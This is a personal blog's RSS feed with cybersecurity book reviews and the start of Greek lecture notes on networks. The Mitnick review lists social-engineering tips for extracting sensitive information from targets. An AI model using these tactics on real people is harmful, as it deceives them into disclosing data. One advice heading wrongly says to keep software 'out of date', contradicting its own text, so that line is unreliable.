<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
 xmlns:content="http://purl.org/rss/1.0/modules/content/"
 xmlns:wfw="http://wellformedweb.org/CommentAPI/"
 xmlns:dc="http://purl.org/dc/elements/1.1/"
 xmlns:atom="http://www.w3.org/2005/Atom"
 xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
 xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
 xmlns:georss="http://www.georss.org/georss"
 xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
 xmlns:media="http://search.yahoo.com/mrss/">
<channel>
<atom:link href="posts/rss.xml" rel="self" type="application/rss+xml" />
<title>Chasing simplicity</title>
<link>https://chatziiola.github.io/rss</link>
<description><![CDATA[Shiiiz]]></description>
<language>en</language>
<lastBuildDate>Thu, 11 Dec 2025 02:21:50 +0200</lastBuildDate>
<generator>Emacs 30.2 org-publish-rss.el 0.8</generator>
<item>
<title>Fatal System Error: The Hunt for the New Crime Lords Who Are Bringing Down the Internet</title>
<link>posts/books/Menn2010_fatalsystemerror.html</link>
<pubDate>Sat, 26 Mar 2022 00:00:00 +0200</pubDate>
<guid>posts/books/Menn2010_fatalsystemerror.html</guid>
<description>
<![CDATA[<div id="outline-container-org57bf871" class="outline-2">
<h2 id="org57bf871"><span class="section-number-2">1.</span> <a href="#org57bf871">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Fatal System Error is a book targeted to a niche audience, that is for sure.
</p>

<p>
Menn&rsquo;s writing style has, from my experience, never been good. Personally, I do
not mind it, since I focus solely on the information given, yet it has never
been acceptable for literature, focusing more on the quantity of <i>facts and
details</i> than the storyline. That is what makes this book, just like Menn&rsquo;s cDc,
such a difficult read. Writing this paragraph, it occured to me that the best
way to describe it would be: &ldquo;<i>notes for an article-turned-book</i>&rdquo;. He has done a
tremendously good job gathering and evaluating information, but he did not
combine them properly. Had the author taken some extra time to polish the book,
maybe reading it more thorougly, I would have no trouble suggesting it to
<b>anyone</b>.
</p>

<p>
After all, I think that this book is important. Not only is it <i>an intersting
read</i> but it also highlights some of our society&rsquo;s problems.
</p>

<p>
However, the timeline is not linear, jumping from one place to another in a
random fashion and confusing the reader with much unnecessary complexity. Some
information given is unimportant to the story and the bigger picture, serving
only to the further confusion of the reader and taking away from crucial moments
in the book.
</p>

<p>
I do not want to be too harsh on Menn. I get it: details are not only included
for their intrinsic value, they also help build the protagonists&rsquo; portraits and
I am not sure whether taking every such element out of the book would help
improve its readability. It is just certain that something should be done in
this direction.
</p>

<p>
Taking a step back, to focus on the better part of the book; Its content is
undoubtedly inspiring, terrifying, thought-provoking and, being someone who is
interested in the field of cybersecurity,  I found it very informative.
</p>

<p>
After all, <code>fbi.pp.ru</code> and <code>mazafaka.ru</code> are excellent naming templates for
one&rsquo;s server<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>
</div>
</div>
<div id="outline-container-orgcc6c027" class="outline-2">
<h2 id="orgcc6c027"><span class="section-number-2">2.</span> <a href="#orgcc6c027">The book at a glance</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Most of the books content is, honestly, frightening. I could not believe the
levels of corruption worldwide (and how deep its roots are in the Net). Almost
every sentence in the book filled me with sadness and disgust. How can something
so beautiful and <i>universal</i> as the Internet have such an ugly dark side&#x2026;
</p>
</div>
<div id="outline-container-orgee447cc" class="outline-3">
<h3 id="orgee447cc"><span class="section-number-3">2.1.</span> <a href="#orgee447cc">Cybersec Philosophy</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
The ethics behind this particular aspect of infosec are a constant theme of the
book. Not only do we see Barret&rsquo;s and Andy&rsquo;s evolution on the topic, but through
the pages book the horror that cybercrime entails becomes apparent, just like
the damages for every involved party.
</p>

<p>
Sadly, the reader also witnesses the weaponization of the cyberspace. No longer
would anyone in the governmental bodies care about Barlow&rsquo;s <a href="https://www.eff.org/cyberspace-independence">Declaration of the
Independence of the Cyberspace</a>; All it does is remind us that cyberspace knows
no boundaries. We are not only its users but its guardians as well and we should
care more about <i>fixing</i> this problem. <sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>
</p>
</div>
</div>
<div id="outline-container-orga606fad" class="outline-3">
<h3 id="orga606fad"><span class="section-number-3">2.2.</span> <a href="#orga606fad">State and Crime</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Even though the book could be considered a <i>brief history of cybercrime</i> it
deals with so much more than just that. What I believe is the most crucial
element in the book, is the power dynamics that developed over time, shaping the
Internet as we know it.
</p>

<p>
Sometime, too long ago for me, yet closer to the present for others, a large
percentage of cybercrime consisted of DDoS attacks, coordinated by criminal
groups and organizations against companies, blackmailing them to get money
otherwise the (potential) clients would have no way of reaching those companies&rsquo;
websites. That did not last for long, though it was not because of the
advancements on the <i>blue-side</i>.
</p>

<p>
There were companies like Barret&rsquo;s Prolexic, actively fighting DDoS attacks and
mitigating their risk, but the threat actors, gaining power from every new
<span class="underline">vulnerable</span> device connected to the internet, evolved much quicklier; It was no
problem even for teenagers to launch DDoS attacks against websites they did not
like.
</p>

<p>
Cybercrime simply moved on. A better alternative to DDoS attack had been found,
and it was <b>Identity Theft</b>. The author suggests some pretty terrifying
statistics here, stating that it is so widespread that more than 4/10 Americans
have fallen victims. But&#x2026; could not the states do something to deal with it?
</p>

<p>
Unfortunately governments of the world did not stand up to the task. While there
was a little bit of movement<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup>, there was minimal to no improvement for the
common computer user. Instead&#x2026;
</p>

<ul class="org-ul">
<li>April 2007: Russian Attack On Estonia</li>
<li>2000-2003: Chinese Attack on the U.S: Operation Titan Rain</li>
<li>2005-2010: U.S (and Israeli) Attack on Iran: Stuxnet</li>
</ul>

<p>
<b>We can do better</b>
</p>
</div>
</div>
<div id="outline-container-orge687d88" class="outline-3">
<h3 id="orge687d88"><span class="section-number-3">2.3.</span> <a href="#orge687d88">Getting Away With It All (Messed Up)</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
<i>What can we do?</i>
</p>

<p>
While it is easy to feel overwhelmed by the burden we have to bear, there are
things we can do to gradually get out of this cybersecurity mess we have found
ourselves in. The answer does not lie in wasting money on various kinds of
security products to make our machines <i>impenetrable</i>. There is no such
thing<sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup>. What we can opt for is <i>raising the lower bound</i><sup><a id="fnr.5" class="footref" href="#fn.5" role="doc-backlink">5</a></sup>.
</p>


<p>
Straight from the book:
</p>
<blockquote>
<p>
Turning on a home PC without a strong firewall and without an operating system
and antivirus software that each update automatically is like leaving a loaded
shotgun on the front porch for passersby
</p>
</blockquote>

<p>
So&#x2026; what to do:
</p>
</div>
<ol class="org-ol">
<li><a id="org5b0be8d"></a><a href="#org5b0be8d">Keep your applications and operating system out of date</a><br>
<div class="outline-text-5" id="text-2-3-0-1">
<p>
Windows users have a right to feel <i>enraged</i> by that, it is however vital
that you do not miss out on security patches. If you do, there is no one to
blame but you.
</p>
</div>
</li>
<li><a id="org26bf6ab"></a><a href="#org26bf6ab">Follow some standard password policies</a><br>
<div class="outline-text-5" id="text-2-3-0-2">
<ol class="org-ol">
<li>Use a password manager</li>
<li>Different strong passwords for each site</li>
<li>Use 2FA</li>
<li>Maybe signup on <a href="https://haveibeenpwned.com/">HaveIBeenPwned</a>. This project notifies you of breaches in
which your email is present.</li>
</ol>
</div>
</li>
<li><a id="org681aa82"></a><a href="#org681aa82"><i>Shame politicians and companies</i> into action and make sure to criticize.</a><br>
<div class="outline-text-5" id="text-2-3-0-3">
<p>
These are fundamental in any democratic society and thus, not limited to the
cybersecurity conversation. Just like it occured to me in footnote <sup><a id="fnr.2.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup>,
such actions should also be extended to the environmental public discussion.
</p>
<ol class="org-ol">
<li>An example I would like to cite here, is access to the internet through an
ID card. Terrifying is not it? Yet it was proposed sometime back to become
a law&#x2026;<sup><a id="fnr.6" class="footref" href="#fn.6" role="doc-backlink">6</a></sup></li>
<li>Second example: Even though it was not ( to my knowledge ) a result of
public pressure on Google, their approach to China&rsquo;s censorship shows there
is hope.</li>
<li>A good starting point of pressure would be the empowerement of
international internet organizations such as ICANN. Should these bodies
have more control, the internet would be a safer place. A second, also
important point could be made out of the <b>necessity</b> that those in power
<span class="underline">listen to the experts</span>.</li>
</ol>
</div>
</li>
<li><a id="org86e507b"></a><a href="#org86e507b">Listen to the experts</a><br>
<div class="outline-text-5" id="text-2-3-0-4">
<p>
The information security landscape is constantly changing. While the time one
can spend on improving their security is limited and, frankly, not so
effective after some time, try to stay up to date with the latest practices.
</p>
</div>
</li>
<li><a id="orgeb80aa4"></a><a href="#orgeb80aa4">Note to SysAds/Techies</a><br>
<div class="outline-text-5" id="text-2-3-0-5">
<p>
Yup, it has been said many times but&#x2026; Try to pass on to your friends,
coworkers, family members the importance of some <i>standard</i> practices. You will,
undoubtedly, get some <i>annoyed</i> looks but, <b>better safe than sorry</b>
</p>
</div>
</li>
</ol>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
These are the names of Russian servers used in criminal operations.
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
It seems that:
</p>
<ul class="org-ul">
<li>We are failing miserably</li>
<li>These sentences could also be used to describe the current situation with our planet.</li>
</ul></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
U.S.A2010: Jay Rockefeller&rsquo;s and Joe Lieberman&rsquo;s Senate bills
</p></div></div>

<div class="footdef"><sup><a id="fn.4" class="footnum" href="#fnr.4" role="doc-backlink">4</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<a href="https://arstechnica.com/features/2021/10/securing-your-digital-life-part-1/?utm_source=pocket_mylist">You are not Batman</a>
</p></div></div>

<div class="footdef"><sup><a id="fn.5" class="footnum" href="#fnr.5" role="doc-backlink">5</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
In algorithm analysis, the lower bound is the minimum amount of (abstract) steps
the algorithm needs to perform in order to complete the given task. Here, it can
be translated, as raising the bar ( in a global level ) for someone to gain
control of a personal computer, IoT device, or any Internet connected device in general.
</p></div></div>

<div class="footdef"><sup><a id="fn.6" class="footnum" href="#fnr.6" role="doc-backlink">6</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Unfortunately, I have no sources on this one, other than the book itself.
I&rsquo;ll happily appreciate any feedback here.
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Ghost in the Wires: My Adventures as the Worlds Most Wanted Hacker</title>
<link>posts/books/Mitnick2011-ghostinthewires.html</link>
<pubDate>Sat, 26 Mar 2022 00:00:00 +0200</pubDate>
<guid>posts/books/Mitnick2011-ghostinthewires.html</guid>
<description>
<![CDATA[<p>
:ID:       019cd0b3-6ee4-408c-a6ed-44d0489c35e3
</p>
<div id="outline-container-org56fdae3" class="outline-2">
<h2 id="org56fdae3"><span class="section-number-2">1.</span> <a href="#org56fdae3">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
I started reading Mitnick&rsquo;s <a href="https://www.amazon.com/Ghost-Wires-Adventures-Worlds-Wanted-ebook/dp/B00FOQS8D6/ref=sr_1_1?keywords=ghost+in+the+wires&amp;qid=1643737271&amp;s=books&amp;sprefix=ghost+in+the+wires%2Cstripbooks%2C198&amp;sr=1-1">Ghost in the Wires: My Adventures as the Worlds Most
Wanted Hacker</a>, almost a month after finishing Menns&rsquo;s exceptional <a href="https://www.amazon.com/Cult-Dead-Cow-Original-Supergroup-ebook/dp/B07J5MW52M/ref=sr_1_1?crid=X6GLMYBDUOJO&amp;keywords=cult+of+the+dead+cow&amp;qid=1643840819&amp;s=digital-text&amp;sprefix=cult+of+the+dead+cow+%2Cdigital-text%2C173&amp;sr=1-1">Cult of the
Dead Cow: How the Original Hacking Supergroup Might Just Save the World</a>. Having
liked it so much and still intrigued in the history of the field, I chose to
dive in it a little bit more.
</p>

<p>
It surely did not disappoint me.
</p>
</div>
</div>
<div id="outline-container-orgdcfc1e9" class="outline-2">
<h2 id="orgdcfc1e9"><span class="section-number-2">2.</span> <a href="#orgdcfc1e9">Mitnick&rsquo;s Adventures</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Kevin Mitnick is one of the worlds most famous (and at a given time in history
<i>infamous</i>) hackers to ever exist. He was only a young boy, an actual teenager,
when he first started experimenting and getting unauthorized access to systems
he was not supposed to touch and this passion never left him. He kept doing it,
no matter how difficult his life had gotten to be because of this obsession.<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>
</p>

<p>
A master of social engineering Mitnick, with the help of his coauthor, Bill
Simons, sheds light on his extraordinary life, covering <b>many</b> of his
adventures. We can see him evolving from a boy that moved around with <i>his own
bus tickets</i> and lurking in his favourite <i>underground</i> bookstore, to a world
class hacker, escaping the F.B.I. with relative ease and leading a normal life.
</p>

<p>
More specifically, page by page, the reader gets to <i>see</i> lots of phreaking,
hacking, jail time, questionable legal practices by his adversaries and
exceptional social engineering, by the greatest to ever do it.
</p>
</div>
<div id="outline-container-org5d62a50" class="outline-3">
<h3 id="org5d62a50"><span class="section-number-3">2.1.</span> <a href="#org5d62a50">Social Engineering</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Social Enginering is a prevalent theme of the book and everyone who has ever
heard of Mitnick can easily understand why.  Under no circumstances can the book
be considered a <i>guide</i> on this field&rsquo;s techniques, but it offers some tips,
always based on the protagonist&rsquo;s own actions:
</p>
</div>
<div id="outline-container-org22da45e" class="outline-4">
<h4 id="org22da45e"><span class="section-number-4">2.1.1.</span> <a href="#org22da45e">Heavy research before contact</a></h4>
<div class="outline-text-4" id="text-2-1-1">
<p>
It is important to use whatever data available to us to gain the SE target&rsquo;s
trust and avoid raising any suspicions. To do that one needs to learn as much as
he can about the company as an organization, the relations between its
departments, the standards/processes followed in the targeted department and of
course, about the way they communicate.
</p>

<p>
Further points of interest may be the targets&rsquo; access to certain information and
the coworkers they interact the most with. Lastly, if you are after a certain
piece of information: under what circumstances are they allowed to share it with
you?
</p>

<blockquote>
<p>
The social-engineering techniques work simply because people are very
trusting of anyone who establishes credibility,
</p>
</blockquote>
</div>
</div>
<div id="outline-container-orgc49e733" class="outline-4">
<h4 id="orgc49e733"><span class="section-number-4">2.1.2.</span> <a href="#orgc49e733">Instead of asking for something, give it a wrong value</a></h4>
<div class="outline-text-4" id="text-2-1-2">
<blockquote>
<p>
If you ask for a piece of sensitive information, people naturally grow
immediately suspicious. If you pretend you already have the information and give
them something that’s wrong, they’ll frequently correct you—rewarding you with
the piece of information you were looking for.
</p>
</blockquote>
</div>
</div>
<div id="outline-container-org4fc8a4f" class="outline-4">
<h4 id="org4fc8a4f"><span class="section-number-4">2.1.3.</span> <a href="#org4fc8a4f">Try to small-talk after getting what you want</a></h4>
<div class="outline-text-4" id="text-2-1-3">
<p>
This helps the attacker hide their tracks, making the victim feel safe and cast
away any doubts they may have had about the interaction.
</p>
</div>
</div>
</div>
<div id="outline-container-orgbe8a28a" class="outline-3">
<h3 id="orgbe8a28a"><span class="section-number-3">2.2.</span> <a href="#orgbe8a28a">The F.B.I.</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
An aspect of the book that made me feel unease were the policies that Kevin&rsquo;s
pursuers had, at times, enforced. Obviously, this can not be considered an
objective source to gain information on what happenned but, since I found
numerous reports aligning with Kevin on the matter, I feel that his was, once
again, a case that was heavily affected by the media, who focusing on
<i>entertainment</i> overstated Kevin&rsquo;s abilities, stating, for example, that he had
repeatedly hacked into NORAD. These kind of absurd claims were later on also
used by the prosecution on trial.
</p>
</div>
</div>
</div>
<div id="outline-container-org5343c5c" class="outline-2">
<h2 id="org5343c5c"><span class="section-number-2">3.</span> <a href="#org5343c5c">Impressive Balance</a></h2>
<div class="outline-text-2" id="text-3">
<p>
An interesting aspect of the book is the balance between technical details and
<i>thriller-like</i> story-telling. You can not help but smile about the innocence
portrayed in it, get angry at some people&rsquo;s betrayal and in at the same time,
feel inspired by others. It is not a technical read, as it focuses more on the
story than the actual techniques Mitnick used. At the same time, however, the
authors included enough details to make the technical reader happy; filling the
older ones with nostalgia and helping the younger ones, such as myself, gain a
better understanding of how the world worked back then. There are lots of
<i>sources</i>, to go after in your own.
</p>

<p>
Interestingly, even though I claim it to be a non-technical read without many
details, it was in this book&rsquo;s pages that I first read about the <code>finger</code>
command. I had never heard of it before.
</p>
</div>
</div>
<div id="outline-container-org8d1fc39" class="outline-2">
<h2 id="org8d1fc39"><span class="section-number-2">4.</span> <a href="#org8d1fc39">My first book review</a></h2>
<div class="outline-text-2" id="text-4">
<p>
This happens to be my first book review (or at least, the first in quite some
time&#x2026;). And I would like to thank whoever is reading this for their support. I
plan to write an article on most of the books that I read and find interesting,
so if you liked it &#x2026; wait for me to implement an rss feed :)
</p>

<p>
Why am I doing it?
</p>

<p>
It sounds really weird saying it out loud (?) but it relaxes me and also helps
me put my Zettelkasten notes in good (theoretically) usage and test them at the
same time. I truly believe
</p>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
For those interested in Kevin&rsquo;s story here is <a href="https://en.wikipedia.org/wiki/Kevin_Mitnick">wikipedia&rsquo;s article on Kevin Mitnick</a>
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>The Pentester Blueprint</title>
<link>posts/books/WylieCrawley_ThePentesterBlueprint.html</link>
<pubDate>Wed, 30 Mar 2022 00:00:00 +0300</pubDate>
<guid>posts/books/WylieCrawley_ThePentesterBlueprint.html</guid>
<description>
<![CDATA[<p>
Some time ago, I bought a <i>Humble Book Bundle</i> on Cybersecurity<sup><a id="fnr.1" class="footref" href="#fn.1" role="doc-backlink">1</a></sup>, and it  
included SOOOO MANY BOOKS. Seriously, when I found out about this bundle, I  
couldn&rsquo;t contain myself. Since then, I&rsquo;ve started reading some of these books,  
always driven by the idea &ldquo;<i>Read more books to read more</i>&rdquo;<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup> and constantly  
working to improve my skills.  
</p>

<p>
I initially skipped this book, focusing on more <i>practical</i> ones, until I came  
across the following Shannon Morse thumbnail. That’s when I decided to start  
reading it, and&#x2026; this is the first book I’ve completed<sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup>.  
</p>

<center>
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/bsGYixzB48g"  
title="YouTube video player" frameborder="0" allow="accelerometer; autoplay;  
clipboard-write; encrypted-media; gyroscope; picture-in-picture"  
allowfullscreen></iframe>  
</center>
<div id="outline-container-orge1c797c" class="outline-2">
<h2 id="orge1c797c"><span class="section-number-2">1.</span> <a href="#orge1c797c">Summary</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Alright, alright, alright. The book is excellent.  
</p>

<p>
That being said, it&rsquo;s important to note that this isn&rsquo;t a book that will teach  
you a lot of new things—most readers will likely already be familiar with the  
terminology used. The title truly captures its essence: it’s a blueprint. The  
authors did a fantastic job selecting <i>training material</i>, compiling tips, and  
interviewing professionals in the information security field. Through its  
content, the book clearly outlines a path to a career in information security,  
presented in an easy-to-read manner.  
</p>

<p>
What happens next is up to you. Action.  
</p>
</div>
<div id="outline-container-org89562a7" class="outline-3">
<h3 id="org89562a7"><span class="section-number-3">1.1.</span> <a href="#org89562a7">Book&rsquo;s Contents:</a></h3>
<div class="outline-text-3" id="text-1-1">
<ol class="org-ol">
<li>What is a Pentester</li>
<li>Prerequisite Skills</li>
<li>Education of a Hacker</li>
<li>Education Resources</li>
<li>Building a Pentesting Lab</li>
<li>Certifications and Degrees</li>
<li>Developing a Plan</li>
<li>Gaining Experience</li>
<li>Getting Employed as a Pentester</li>
</ol>
</div>
</div>
<div id="outline-container-org20b2edf" class="outline-3">
<h3 id="org20b2edf"><span class="section-number-3">1.2.</span> <a href="#org20b2edf">Tips:</a></h3>
<div class="outline-text-3" id="text-1-2">
<ul class="org-ul">
<li>Every skill, no matter how <i>technical</i>, can be valuable in information  
security.</li>
<li>Focus on mastering the basics before moving on to more <i>complex</i> topics.  
General certification programs such as CompTIA&rsquo;s A+, Security+, and Network+  
are helpful for building this foundation.</li>
<li>Read and practice extensively. Setting up and experimenting with your own lab  
and participating in CTFs are great ways to advance.  
<ul class="org-ul">
<li>Keep notes on the challenges you face and your progress so you can always  
refer back to them.</li>
</ul></li>
</ul>
</div>
</div>
</div>
<div id="outline-container-orgc0a7a99" class="outline-2">
<h2 id="orgc0a7a99"><span class="section-number-2">2.</span> <a href="#orgc0a7a99">Resources to check:</a></h2>
<div class="outline-text-2" id="text-2">
<p>
I debated for a long time before publishing this article, and I ultimately  
decided that the best way to <i>connect</i> it with the book would be to list some  
useful resources that anyone can explore<sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup>:  
</p>
<ul class="org-ul">
<li class="off"><code>[&#xa0;]</code> <a href="https://attack.mitre.org">https://attack.mitre.org</a></li>
<li class="off"><code>[&#xa0;]</code> CompTIA certifications (as mentioned in the tips)</li>
<li class="off"><code>[&#xa0;]</code> VulnHub</li>
<li class="off"><code>[&#xa0;]</code> <a href="https://danielmiessler.com/">https://danielmiessler.com/</a>  
<ul class="org-ul">
<li><span class="timestamp-wrapper"><span class="timestamp">&lt;2025-01-31 Fri&gt; </span></span> I have since become a huge fan of his newsletter.</li>
</ul></li>
<li class="off"><code>[&#xa0;]</code> <a href="https://jhalon.github.io/becoming-a-pentester">https://jhalon.github.io/becoming-a-pentester</a></li>
<li class="off"><code>[&#xa0;]</code> <a href="http://www.porcupine.org/satan/admin-guide-to-cracking.html">http://www.porcupine.org/satan/admin-guide-to-cracking.html</a>  
<i>The first proper whitepaper on ethical hacking</i></li>
<li class="off"><code>[&#xa0;]</code> <a href="https://quizlet.com/395420241/ceh-v10-flash-cards/">https://quizlet.com/395420241/ceh-v10-flash-cards/</a></li>
</ul>
</div>
<div id="outline-container-org25fec0e" class="outline-3">
<h3 id="org25fec0e"><span class="section-number-3">2.1.</span> <a href="#org25fec0e">Note</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
If you&rsquo;ve ever considered yourself an <i>information hoarder</i>, striving to  
function at the highest level (without overloading yourself—it took me a long  
time to manage that, and it&rsquo;s still a work in progress), I highly recommend  
getting this book.  
</p>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<a href="https://humblebundle.com/books?hmb_source=navbar">https://humblebundle.com/books?hmb_source=navbar</a>  
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I will probably devote an article to this idea someday. I once read a  
beautifully written piece on this perspective, but I didn&rsquo;t have my current  
organization system in place, so it got lost among other articles.  
</p></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Some might argue that since <i>I skipped the last chapter</i>, I didn’t  
technically complete it. However, that chapter isn’t relevant to me at the  
moment. That will inevitably change in the future, and when it does, I’ll make  
sure to read it.  
</p></div></div>

<div class="footdef"><sup><a id="fn.4" class="footnum" href="#fnr.4" role="doc-backlink">4</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
Obviously, these resources cannot replace the book itself. They are  
found within it but represent only a small fraction of its content.  
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>Διάλεξη (1): Υλική εξέλιξη των δικτύων.</title>
<link>posts/lectures/auth/cn1/lec_CN1_20230314.html</link>
<pubDate>Tue, 14 Mar 2023 00:00:00 +0200</pubDate>
<guid>posts/lectures/auth/cn1/lec_CN1_20230314.html</guid>
<description>
<![CDATA[<div class="note" id="org715a2bb">
<p>
Δεν είναι ιδιαίτερα ποιοτικές σημειώσεις, τόσο λόγω της αδυναμίας μου να
συγκεντρώσω κατάλληλα το αντικείμενο όπως αυτό διδάσκεται, όσο και λόγω της
έλλειψης χρόνου για <i>άμεση</i> επανάληψη του αντικειμένου με αποτέλεσμα να μην
θυμάμαι αρκετά καλά ορισμένες <i>εγκυκλοπαιδικές</i> αναφορές.
</p>

</div>
<div id="outline-container-org27a0d31" class="outline-2">
<h2 id="org27a0d31"><span class="section-number-2">1.</span> <a href="#org27a0d31">Εισαγωγή (επανάληψη στα της αρχικής διάλεξης)</a></h2>
<div class="outline-text-2" id="text-1">

<div id="orga11b739" class="figure">
<p><img src="posts/lectures/auth/cn1/course_cn1_images/230327_2341_intro.png" alt="230327_2341_intro.png">
</p>
<p><span class="figure-number">Figure 1: </span>Κάνοντας εικόνα τις διαφορετικές απαιτήσεις καλωδίων</p>
</div>

<p>
Με το κόστος του δικτύου, το βασικό ζητούμενο είναι η ισορροπία μεταξύ κόστους
και QoS (όχι με τον αυστηρά τεχνικό όρο). Όσο μεγαλύτερο είναι το πλήθος των
γραμμών (\(M\)) τόσο μεγαλύτερο είναι και το κόστος του δικτύου, με αποτέλεσμα να
θέλουμε, για δεδομένο αριθμό συνδεδεμένων συσκευών (\(N\)) να έχουμε ένα όσο το
δυνατόν μικρότερο πλήθος καλωδιών, χωρίς όμως αυτό να επηρεάζει τους χρήστες.
</p>

<p>
Αυτό γίνεται ουσιαστικά στο τρίτο <i>στάδιο</i> που φαίνεται στην εισαγωγική εικόνα.
</p>

<p>
Εγινε ακόμα γενική αναφορά σε LANs, WANs, και την μεταξύ τους σύνδεση.
</p>

<div id="orga284066" class="figure">
<p><img src="posts/lectures/auth/cn1/course_cn1_images/230327_2350_lan-wan.png" alt="230327_2350_lan-wan.png">
</p>
<p><span class="figure-number">Figure 2: </span>Προς έλλειψη καλύτερου σχήματος, ένα συνοπτικό σχήμα.</p>
</div>

<p>
Συνοπτικά, καθώς αυτές είναι πιο <i>απτές</i> έννοιες από πολλές άλλες που
πραγματεύονται αυτές οι διαλέξεις, για τους όρους LAN (Local Area Network) και
WAN(Wide Area Network) οι ορισμοί είναι δύσκολο να δοθούν ντετερμινιστικά, και
αυτό γιατί υπάρχουν <b>πολλοί</b> τύποι δικτύων οι οποίοι <i>μπορεί</i> να υπάρξουν μεταξύ των
δύο (για παράδειγμα CAN(Campus AN), MAN(Metropolitan AN) &#x2026;).
</p>

<p>
Παρόλα αυτά, κάνω μία προσπάθεια εδώ διαχώρισης σε κάποιο επίπεδο των εννοιών:
Το LAN, είναι κατα κύριο λόγο ένα δίκτυο το οποίο έχει περιορισμένο γεογραφικά
χαρακτήρα (όροφος κτηρίου, διαμέρισμα, εγκαταστάσεις μικρού καφέ) και κατα
κανόνα προσφέρει δύο τρόπους σύνδεσης των συσκευών: ασύρματα μέσω διαφόρων
Access Points, είτε ενσύρματα με τα γνωστά λίγο πολύ σε όλους καλώδια Ethernet.
</p>

<p>
Αντίθετα το WAN, δίκτυο στο οποίο δεν συνδέονται οι τελικές συσκευές των χρηστών
αλλά ευρύτερη <i>ένωση</i> μικρότερων δικτύων (LANs, CANs, MANs &#x2026;), έχει μεγάλη
γεωγραφική έκταση και <i>υποστηρίζει</i> μεγάλο πλήθος διαφορετικών προτοκόλλων (στα
χαμηλότερα επίπεδα του δικτύου)και καλωδιώσεων.
</p>
</div>
</div>
<div id="outline-container-org8a389b8" class="outline-2">
<h2 id="org8a389b8"><span class="section-number-2">2.</span> <a href="#org8a389b8">POTS</a></h2>
<div class="outline-text-2" id="text-2">
<ul class="org-ul">
<li>Circuit Switching (Μεταγωγή κυκλώματος)</li>
<li>Δίκτυα υπολογιστών επί <b>POTS</b> <i>(Plain Old Telephone Service)</i></li>
<li>Κλήση με Dialing
<ul class="org-ul">
<li>Ορολογία συμμετέχοντων συσκευών: <i>Receiver, Transceiver</i></li>
</ul></li>
<li><p>
Έγινε γενική αναφορά στην (από πίσω) υποδομή:
</p>
<ul class="org-ul">
<li>στους <i>τοπικούς</i> κατανεμητές (τηλεφωνικά <i>KW</i>)</li>
<li>και τον κεντρικό κατανεμητή (στις εγκαταστάσεις του παρόχου (OTE)),</li>
</ul>
<p>
Καταλήγοντας εκεί από το σπίτι μας σε μορφή συνεχούς ηλεκτρικής σύνδεσης.
</p></li>

<li>Μπαταρίες για την διαμόρφωση του κυκλώματος.</li>
</ul>

<div class="note" id="orgd276a77">
<p>
Κατα Μητράκο η εξέταση τέτοιων συστημάτων επεξηγεί τις επιδόσεις στα σύγχρονα συστήματα
</p>

</div>
</div>
</div>
<div id="outline-container-org7bd25d7" class="outline-2">
<h2 id="org7bd25d7"><span class="section-number-2">3.</span> <a href="#org7bd25d7">Αναλογικές επικοινωνίες και τρόπος λειτουργίας</a></h2>
<div class="outline-text-2" id="text-3">

<div id="org92affdf" class="figure">
<p><img src="posts/lectures/auth/cn1/course_cn1_images/230327_2232_aplo-pots-kykloma.png" alt="230327_2232_aplo-pots-kykloma.png">
</p>
<p><span class="figure-number">Figure 3: </span>Απλουστευμένο simplex τηλεφωνικό κύκλωμα</p>
</div>

<ul class="org-ul">
